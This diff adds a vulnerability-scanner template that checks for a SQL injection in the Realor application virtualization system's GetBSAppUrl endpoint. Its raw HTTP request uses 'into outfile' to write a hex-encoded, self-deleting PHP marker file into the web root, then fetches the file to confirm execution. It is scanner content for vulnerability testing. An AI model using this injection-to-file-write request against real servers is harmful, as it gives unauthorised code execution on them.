@@ -1,0 +1,33 @@
+id: realor-getbsappurl-sqli-to-rce
+
+info:
+  name: 瑞友应用虚拟化系统 GetBSAppUrl SQL注入
+  author: SleepingBag945
+  severity: critical
+  description: |
+    瑞友 应用虚拟化系统 GetBSAppUrl方法存在SQL注入漏洞，由于参数传入没有进行过滤导致存在SQL注入，攻击者通过漏洞可以获取数据库敏感信息
+    漏洞影响：瑞友应用虚拟化系统 7.0.2.1
+    "CASMain.XGI?cmd=GetDirApp" && title=="瑞友应用虚拟化系统"
+  tags: realor,sqli
+
+
+
+http:
+  - raw:
+      - |
+        GET /index.php?s=/Agent/GetBSAppUrl/AppID/')%3bselect+0x3c3f706870206563686f203131312a3131313b20756e6c696e6b285f5f46494c455f5f293b203f3e+into+outfile+%27..\\\\\\\\..\\\\\\\\WebRoot\\\\\\\\{{randstr}}.XGI%27%23/123 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/json
+        Accept-Encoding: gzip
+
+      - |
+        GET /{{randstr}}.XGI HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - status_code_1==200 && contains(body_1,"result=")
+          - status_code_2==200 && contains(body_2,"12321")
